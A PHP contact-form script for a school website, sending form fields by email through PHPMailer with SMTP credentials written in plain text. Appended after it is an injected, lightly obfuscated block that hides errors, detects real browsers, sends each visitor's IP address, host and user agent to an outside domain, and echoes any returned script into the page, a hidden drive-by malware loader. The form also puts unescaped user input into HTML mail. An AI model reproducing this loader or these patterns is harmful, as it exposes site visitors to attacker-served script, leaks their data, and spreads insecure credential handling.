<?php
include( 'classes/class.phpmailer.php' );

$nome = $_REQUEST['nome'];
$email = $_REQUEST['email'];
$telefone = $_REQUEST['telefone'];
$mensagem = $_REQUEST['mensagem'];

$html = 'Nome: ' . $nome . '<br />';
$html .= 'Email: ' . $email . '<br />';
$html .= 'Telefone: ' . $telefone . '<br />';
$html .= 'Mensagem: ' . $mensagem . '<br />';

$email = new PHPMailer();
$email->SetLanguage("br");
$email->IsSMTP();
$email->IsHTML(true);
$email->SMTPAuth = true;
$email->Port = 587;
$email->Host = 'smtp.beitschool.com';
$email->Username = 'envia@beitschool.com';
$email->Password = 'enviasite123';
$email->From = 'envia@beitschool.com';
$email->FromName = 'Contato - Beit School';
$email->AddAddress("bruno@beitschool.com");
$email->Subject = 'Contato site';
$email->Body = $html;

if( $email->Send() ) {
	header( 'Location:contato.php?m=1#rodape-content' );
	exit;
}

else {
	header( 'Location:contato.php?m=0#rodape-content' );
	exit;
}

?>
<?php
#15d428#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/15d428#
?>